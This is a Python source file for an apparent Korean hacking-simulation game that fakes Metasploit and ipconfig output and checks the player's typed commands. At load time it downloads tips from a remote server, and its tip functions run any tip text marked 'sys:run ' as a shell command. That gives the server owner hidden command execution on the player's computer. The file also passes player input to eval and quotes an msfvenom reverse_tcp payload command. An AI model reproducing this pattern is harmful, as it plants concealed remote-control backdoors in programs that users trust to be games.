from random import *
import os, json
import requests
import ast

lis = ast.literal_eval(json.loads(requests.get('http://sv.m03.pw:8000/api/cmd').content.decode()))
tipl = ast.literal_eval(json.loads(requests.get('http://sv.m03.pw:8000/api/tip').content.decode()))
nTip = ast.literal_eval(json.loads(requests.get('http://sv.m03.pw:8000/api/new_tip').content.decode()))
mStep = ast.literal_eval(json.loads(requests.get('http://sv.m03.pw:8000/api/count').content.decode()))

def semStep(step: int):
	semStep = [int(i) for i in mStep]	
	return semStep[step]

def ipconfig(src: str):
	return('''Windows IP 구성

이더넷 어댑터 이더넷:

   연결별 DNS 접미사. . . . : 
   링크-로컬 IPv6 주소 . . . . : fe80::99ff:aae8:27e0:d6bd%16
   IPv4 주소 . . . . . . . . . : 144.13.135.13
   서브넷 마스크 . . . . . . . : 255.255.255.0
   기본 게이트웨이 . . . . . . : 144.13.135.255

무선 LAN 어댑터 Wi-Fi:

   미디어 상태 . . . . . . . . : 미디어 연결 끊김
   연결별 DNS 접미사. . . . : \n''')

def man(src: str):
	src = src[0]
	if src == 'msfvenom':
		return '''back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
go_pro        Launch Metasploit web GUI
grep          Grep the output of another command
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers
'''
	elif src=='msfconsole':
		return '''Usage: msfconsole [options]
Common options
	-E, --environment ENVIRONMENT	The Rails environment. Will use RAIL_ENV environment variavle if that is set. Defaul neither option not RAIL_ENV environment variable is set.

Database options
	-M, --migration-path DIRECTORY	Specify a directory containing additional DB migrations
	-n,  --no-database			Disable database support
	-y,  --no yaml PATH		Specify a YAML file containing database settings

Framework options
	-c FILE				Load the specified configuration file
	-v,  --version			Show version

Module option
	     --defer-module-loads		Defer module loading unless explicitly asked.
	-m, --module-path DIRECTORY	An additional module path

Console options:
	-a,  --ask				Ask before exiting Metasploit or accept 'exit -y'
	-d,  --defanged			Execute the console as defanged
	-L,  --real-readline			Use the system Readling library instead of RbReadline
	-o,  --output FILE			Output to the specified file
	-p,  --plugin PLUGIN		Load a plugin on startup
	-q,  --quiet			Do not print the banner on startup
	-r,  --resource FILE			Execute the specified resource file (- for stdin)
	-x,  --execute-command COMMAND	Execute the specified string as console commands (use ; for multiples)
	-h, --help				Show this message
	'''
	elif src=='get-cam':
		return '''Usage of Get-Cam
get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'''
	elif src=='cellbroad-attack':
		return '''Usage: cellbroad-attack [URL]
Example: cellbroad-attack http://sv.m03.pw/video/03.mp4'''
	else:
		return 'NO'

def msfvenom(src: str):
	src = ' '.join(src)
	if src=='-p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe':
		print('File Created')
		os.system('echo kekeke > back.exe')
		return '''No platform was selected, choosing Msf: : m=Modoul: : Platform: :Windows from the paload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333bytes
Final size of exe file: 73802 bytes'''

def msf(src: str):
	return '[*] MSF Handler Started...'

def set(src: str):
    src = ' '.join(src)
    if 'LHOST' in src:
        return '[*] lhost => 144.13.135.13'
    elif 'LPORT' in src:
        return '[*] lport => 2031'
    elif 'Exit' in src:
        return '[*] ExitONsession => false'
    elif 'payload' in src:
       	return '[*] payload => windows/meterpreter/reverse_tcp'

def open(src: str):
	file = src[0]
	if file == "protect_system.cpp":
		return '''on:parent+mainText 00 00 00 18 66 74 79 70 6d 70 34 32 00 00 00 00
6d 70 34 31 69 73 6f 6d 00 00 00 28 75 75 69 64
5c a7 08 fb 32 8e 42 05 a8 61 65 0e ca 0a 95 96
00 00 00 0c 31 30 2e 30 2e 31 39 30 34 32 2e 30
00 28 16 e5 6d 64 61 74 00 00 00 00 00 00 00 10
00 00 00 02 09 10 00 00 00 16 06 00 07 80 af 39
00 af ef 40 01 07 00 00 03 00 00 03 00 00 04 80
00 00 c2 ad 25 88 80 4f b8 0f 7e 01 1f 11 e3 dc
17 40 14 39 11 f8 bf 4d 3b dc 08 b3 fe 21 3a f2
57 f4 12 fd b8 0a 8d a2 b9 57 8f 2a 94 63 34 cc
25 52 c2 c4 cb 32 a0 98 f9 71 fa 3c 96 8c bb 5e
37 bf 0c 13 48 3b 9d a5 e4 d7 86 d1 79 ad b0 e7
15 2c 7c 01 0b 63 82 a0 57 c3 8a d0 6e c6 5d 2f
7f 79 20 d3 a1 13 54 53 60 3f 05 61 45 c9 4a 96
9d e5 40 72 35 62 c8 4c 68 65 00 91 8a fc 01 34
39 d5 c2 27 6c 69 73 77 c4 46 c1 30 83 c1 5e 4d
43 09 40 31 c3 d6 e8 cb 0b a7 8d 1b 45 ca e2 15
a6 59 95 69 3d cc e8 81 8b f8 a5 22 c2 05 16 df
dd c4 7d 23 c9 81 05 ef 24 0c f2 21 d6 3b a2 e5
d1 6d 32 35 ce 84 a7 cd 76 76 81 8c c0 0b 95 c8
f6 87 64 a8 cd aa e5 d1 01 d1 e8 ed 7d e7 c7 24
a9 e0 fe 35 21 0f 6b 9c fd b6 8d 32 d7 2d f3 e2
83 63 36 a4 de 05 5c 3f c1 b0 04 32 5a 38 6c b1
40 29 37 4b d7 6e b0 b1 a7 d7 aa 9b 3f 20 8f 11
00 00 00 18 66 74 79 70 6d 70 34 32 00 00 00 00
6d 70 34 31 69 73 6f 6d 00 00 00 28 75 75 69 64
5c a7 08 fb 32 8e 42 05 a8 61 65 0e ca 0a 95 96
00 00 00 0c 31 30 2e 30 2e 31 39 30 34 32 2e 30
00 28 16 e5 6d 64 61 74 00 00 00 00 00 00 00 10
00 00 00 02 09 10 00 00 00 16 06 00 07 80 af 39
00 af ef 40 01 07 00 00 03 00 00 03 00 00 04 80
00 00 c2 ad 25 88 80 4f b8 0f 7e 01 1f 11 e3 dc
17 40 14 39 11 f8 bf 4d 3b dc 08 b3 fe 21 3a f2
57 f4 12 fd b8 0a 8d a2 b9 57 8f 2a 94 63 34 cc
25 52 c2 c4 cb 32 a0 98 f9 71 fa 3c 96 8c bb 5e
37 bf 0c 13 48 3b 9d a5 e4 d7 86 d1 79 ad b0 e7
15 2c 7c 01 0b 63 82 a0 57 c3 8a d0 6e c6 5d 2f
7f 79 20 d3 a1 13 54 53 60 3f 05 61 45 c9 4a 96
9d e5 40 72 35 62 c8 4c 68 65 00 91 8a fc 01 34
39 d5 c2 27 6c 69 73 77 c4 46 c1 30 83 c1 5e 4d
43 09 40 31 c3 d6 e8 cb 0b a7 8d 1b 45 ca e2 15
a6 59 95 69 3d cc e8 81 8b f8 a5 22 c2 05 16 df
dd c4 7d 23 c9 81 05 ef 24 0c f2 21 d6 3b a2 e5
d1 6d 32 35 ce 84 a7 cd 76 76 81 8c c0 0b 95 c8
f6 87 64 a8 cd aa e5 d1 01 d1 e8 ed 7d e7 c7 24
a9 e0 fe 35 21 0f 6b 9c fd b6 8d 32 d7 2d f3 e2
83 63 36 a4 de 05 5c 3f c1 b0 04 32 5a 38 6c b1
40 29 37 4b d7 6e b0 b1 a7 d7 aa 9b 3f 20 8f 11'''

	elif file == "protect_system.decom":
		return '''on:parent+mainText DECOMPILER of CPP EXE FILES by Ansterma. ver1a
----SRC----
SecurityCommonService.loginCodeSubject();
Password = dEcodE36#;
Pcore_T = 21;
if(Pcore_T != 100)
{
	Principal petePrincipal = new PrincipalImpl(“pete”);
	Subject pete = new Subject(petePrincipal);
	PasswordFactory pf = new PasswordFactory(“petepw”);
	pete.getCredentialFactories().add(pf);
	AuthenticationRepositoryService.addSubject(pete);
	Policy policy = new Policy();
	Role someRole = new RoleImpl(“someRole”);
	Permission rolePermission = new RolePermission(someRole);
	policy.getRolePolicy().addPermission( rolePermission, new Object[] {petePrincipal}, false, false);
	Permission rscPermission = new ResourcePermission(“rsc1”, “action1,action2”);
	policy.getResourcePolicy(“ctx1”, true).addPermission(rscPermission, new Object[] {someRole}, false, false);
	AuthorizationRepositoryService.addPolicy(policy);
	SecurityCommonService.logout();
	Subject core2 = Subject.makeSubject(“core”, “corepw”);
	SecurityCommonService.loginDefault(core2);
	SecurityCommonService.checkPermission(“prt1”, new ResourcePermissin(“prt1”, “protect_start”);
	System.out.println(SecurityCommonService.getCurrentSubject().getPrincipal().getName());
}
else
{
	System.out.println(“DO NOT PROTECT”);
}
SecurityCommonService.logout();
'''

def cellbroad_attack(src: str):
	num = src[0]
	del(src[0])
	src = ' '.join(src)
	return f'''[*] Broadcasting SMS Signal to cell system
[*] Sending message {src} to Near Signal
[*] CBS Initalizing'''

def result(cmd: str):
	flag = cmd.split(' ')
	app = flag[0]
	del(flag[0])
	if not app in globals().keys():
		result = 'Unknown Command. Check if installed or spelling.\n'
	else:
		print(app + f'({flag})')
		if flag == []: 
			print('EmptyFlag')
			flag = ['']
		result = eval(app+f'({flag})')
	return(result)

def show_ans(src: str):
	return '% Answer on mainText %\n'

def tip(step: int):
	if 'sys:run ' in tipl[step]:
		os.system(tipl[step].replace('sys:run ',''))
	return(tipl[step])

def newTip(step: int, count: int):
	print(step, count)
	if count == semStep(step):
		return '다음 단계로 넘어가자'
	newTip = nTip[step][count]
	if 'sys:run ' in newTip:
		os.system(newTip.replace('sys:run ',''))
	return newTip

def isCorrect(cmd: str, step: int, count: int, windows=None):
	print(cmd, step, count)
	if windows != None:
		if cmd == 'show_ans':
			windows.mainText.append(lis[step][count])
	if lis[step][count] == cmd:
		print(True)
		return True

if __name__ == "__main__":
	print(lis)
	print(tipl)
	print(nTip)
